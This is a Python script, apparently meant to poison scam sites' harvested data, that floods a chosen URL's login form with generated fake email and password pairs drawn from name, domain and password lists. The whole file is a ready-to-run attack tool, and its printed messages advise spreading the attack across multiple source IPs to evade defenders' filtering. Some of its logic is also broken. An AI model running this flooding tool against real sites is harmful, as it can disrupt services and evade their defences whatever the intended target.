import requests
import os
import random
import string
import json
import optparse

global_verbose = False


def attack_uri_no_password_list(uri, password_field, username_field, name_list, email_list):
    chars = string.ascii_letters + string.digits + '!@#$%^&*()'
    random.seed = (os.urandom(1024))

    url = uri

    names = json.loads(open(name_list).read())
    emails = json.loads(open(email_list).read())

    for name in names:
        name_extra = ''.join(random.choice(string.digits))

        # generates a random username from our name and email provider list
        username = name.lower() + name_extra + '@' + random.choice(emails)

        # generates a random 8char password
        password = ''.join(random.choice(chars) for i in range(8))

        # send the attack request
        requests.post(url, allow_redirects=False, data={
            username_field: username,
            password_field: password
        })

        # checks if verbose is enabled and prints progress if required
        if global_verbose:
            print('sending username %s and password %s' % (username, password))


def attack_uri_custom(uri, password_field, username_field, name_list, email_list, pass_list):
    random.seed = (os.urandom(1024))

    url = uri

    names = json.loads(open(name_list).read())
    emails = json.loads(open(email_list).read())
    passwords = json.loads(open(pass_list).read())

    for name in names:
        name_extra = ''.join(random.choice(string.digits))

        # generates a random username from our name and email provider list
        username = name.lower() + name_extra + '@' + random.choice(emails)

        # picks a password from our password list
        password = ''.join(random.choice(passwords))

        # send the attack request
        requests.post(url, allow_redirects=False, data={
            username_field: username,
            password_field: password
        })

        # checks if verbose is enabled and prints progress if required
        if global_verbose:
            print('sending username %s and password %s' % (username, password))


def main():

    # use optparse to handle commandline args, generate help responses, instructions, and use examples
    parser = optparse.OptionParser('usage: python scam-enhanced.py ' +
                                   '-H <target host URI> -P <target password field> \n-U <target username field> ' +
                                   '-n <list of names> \n-e <list of email providers> -l <list of passwords to use> ' +
                                   '\n-v <verbose mode>')

    parser.add_option('-H', '--host', dest='target_uri', type='string',
                      help='[required] specify target host URI used for the request')
    parser.add_option('-P', '--pass', dest='target_password_field', type='string',
                      help='[required] specify the name of the target password field in the request')
    parser.add_option('-U', '--user', dest='target_username_field', type='string',
                      help='[required] specify the name of the target user name field in the request')
    parser.add_option('-n', '--name', dest='name_list', type='string',
                      help='specify the .json file containing names for email generation')
    parser.add_option('-e', '--email', dest='email_list', type='string',
                      help='specify the .json file containing email provider domains in `"[name].[tld]`" format')
    parser.add_option('-l', '--list', dest='password_list', type='string',
                      help='specify the .json file containing passwords for use in the attack, (rockyou.json is best')
    parser.add_option('-v', '--verbose', dest='verbose', default=False, action='store_true', help='enable verbose mode')

    (options, args) = parser.parse_args()

    # check for minimum required options, throw error if missing.
    if (options.target_uri is "" ) or (options.target_password_field is "") or (options.target_username_field is ""):
        parser.error('minimum required options are not provided, execution can not continue')
    else:
        if options.verbose:
            global global_verbose
            global_verbose = options.verbose

    # check for maximum specificity options and execute if available
    if options.name_list and options.email_list and options.password_list:
        # notify user of the start of the attack and warn about IP filtering as a defense to this attack
        print('info: Attack started...')
        print('info: please consider distributing your attack across multiple source IP to make filtering of your '
              'attack supplied data from the defenders results more difficult.')
        attack_uri_custom(options.target_uri, options.target_password_field, options.target_username_field,
                          options.name_list, options.email_list, options.password_list)
    # checks for minimum specificity options and executes if available
    if options.name_list and options.email_list:
        # provide user a warning about trivial filtering of attacker supplied data
        print('warning: This attack will use randomly Generated passwords which could be easily filtered'
              '\n We would recommend the use of a password list like rockyou_1k.json or other field generated list'
              '\n Execution will continue....')
        attack_uri_no_password_list(options.target_uri, options.target_password_field, options.target_username_field,
                                    options.name_list, options.email_list)
    else:
        parser.error('provided arguments create too generic of an attack and will be easily filter by the defender'
                     '\n Execution Aborted!')


# launch main execution
if __name__ == '__main__':
    main()
